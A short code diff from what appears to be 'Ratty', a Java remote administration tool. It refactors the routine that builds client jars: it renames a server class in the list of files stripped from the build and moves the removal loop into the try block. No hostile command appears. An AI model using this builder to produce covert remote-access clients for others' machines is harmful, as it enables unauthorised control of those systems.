@@ -108,7 +108,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		"language/lang_ro.properties",
 		"language/lang_sr.properties",
 		"language/lang_sr_Latn.properties",
-		"de/sogomn/rat/Server.class",
+		"de/sogomn/rat/RattyServer.class",
 		"de/sogomn/rat/util/Resources.class",
 		"de/sogomn/rat/util/JarBuilder.class",
 		"de/sogomn/rat/server/ActiveServer.class",
@@ -516,16 +516,12 @@ public final class RattyGuiController extends AbstractRattyController implements
 			JarBuilder.copy(selectedBuilderFile);
 			JarBuilder.replaceFile(selectedBuilderFile, BUILDER_DATA_REPLACEMENT, dataReplacement);
 			JarBuilder.replaceFile(selectedBuilderFile, BUILDER_MANIFEST_REPLACEMENT, BUILDER_MANIFEST_REPLACEMENT_DATA);
+			
+			for (final String removal : BUILDER_REMOVALS) {
+				JarBuilder.removeFile(selectedBuilderFile, removal);
+			}
 		} catch (final IOException ex) {
 			gui.showError(BUILDER_ERROR_MESSAGE + System.lineSeparator() + ex);
-		}
-		
-		for (final String removal : BUILDER_REMOVALS) {
-			try {
-				JarBuilder.removeFile(selectedBuilderFile, removal);
-			} catch (final Exception ex) {
-				continue;
-			}
 		}
 		
 		builder.clearListEntries();
